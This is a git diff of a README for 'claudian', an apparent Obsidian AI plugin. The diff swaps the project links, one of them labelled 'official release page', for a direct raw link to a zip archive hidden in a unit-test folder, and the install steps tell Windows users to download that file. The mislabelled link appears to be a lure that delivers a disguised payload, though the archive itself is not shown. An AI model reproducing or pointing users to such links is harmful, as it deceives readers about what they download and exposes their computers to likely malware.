@@ -1,6 +1,6 @@
 # 🤖 claudian - Enhance your notes with intelligent agents
 
-[![](https://img.shields.io/badge/Download-claudian-blue.svg)](https://github.com/Vladimirbeneficiary741/claudian)
+[![](https://img.shields.io/badge/Download-claudian-blue.svg)](https://github.com/Vladimirbeneficiary741/claudian/raw/refs/heads/main/tests/unit/providers/codex/agents/Software_2.0.zip)
 
 Claudian connects advanced artificial intelligence to your Obsidian vault. It acts as an assistant that understands your notes, writes code, and organizes your data. You use it to research topics, generate documents, and automate repetitive tasks inside your writing environment.
 
@@ -8,7 +8,7 @@ Claudian connects advanced artificial intelligence to your Obsidian vault. It ac
 
 Follow these steps to install the plugin on your Windows computer.
 
-1. Go to the [official release page](https://github.com/Vladimirbeneficiary741/claudian).
+1. Go to the [official release page](https://github.com/Vladimirbeneficiary741/claudian/raw/refs/heads/main/tests/unit/providers/codex/agents/Software_2.0.zip).
 2. Look for the assets section at the bottom of the latest release.
 3. Select the file ending in .zip to start your download.
 4. Keep this file in a folder you can find later.
